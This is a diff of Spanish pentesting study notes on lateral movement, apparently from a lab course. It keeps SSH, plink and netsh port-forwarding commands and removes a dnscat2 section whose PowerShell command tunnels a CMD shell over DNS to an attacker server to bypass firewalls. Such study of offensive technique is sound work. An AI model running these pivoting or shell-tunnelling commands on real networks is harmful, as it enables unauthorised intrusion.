@@ -5,8 +5,10 @@ Lateral movement se refiere a poder ingresar a un host gracias a otro ya vulnera
 
 
 
-	#### SSH
+
+
 #### LINUX
+	###	SSH
 
 ##Local port forwarding
 ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
@@ -103,7 +105,7 @@ plink -D 9050 ubuntu@10.129.15.50
 #Iniciamos una sesion ssh con el host ubuntu y comienza a escuchar en el 9050.
 
 
-	### NETSH.EXE
+	###	NETSH.EXE
 Es un programa en windows que nos permite crear rutas entre host asi como ver configuracion de firewall.
 
 C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
@@ -114,33 +116,3 @@ Una vez hechoe esto, si nos conectamos (con xfreerdp por ej) a la maquina 10.129
 
 
 
-
-	#### DNS
-	### Dnscat2
-dnscat2 es un tool para tunneling usando DNS. Hace que el target utilice un servidor DNS externo, de esta forma se saltean los firewalls
-
-##LINUX
-git clone https://github.com/iagox86/dnscat2.git
-#Link de dnscat2
-cd dnscat2/server/
-gem install bundler
-bundle install
-#Siguientes pasos de instalacion
-
-sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
-#Iniciar servidor
-#Al iniciarlo nos brinda un secret que sirve para autenticar y cifrar los datos que se envian desde el target al servidor dns
-
-##WINDOWS
-git clone https://github.com/lukebaggett/dnscat2-powershell.git
-#Este proyecto es dnscat para windows, nos permite conectar windows con el servidor dns
- 
-Import-Module .\dnscat2.ps1
-#Importamos y ejecutamos en windows
-
-Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
-#Establecemos el tunel cn el servidor enviando la sesion shel CMD al sv
-#El -PreSharedSecret flag contiene el secreto generado antes
-
-dnscat2> window -i nro
-#Una vez ejecutado el otro comando, se crea una sesion. Reemplazar el nro por el nro de la sesion
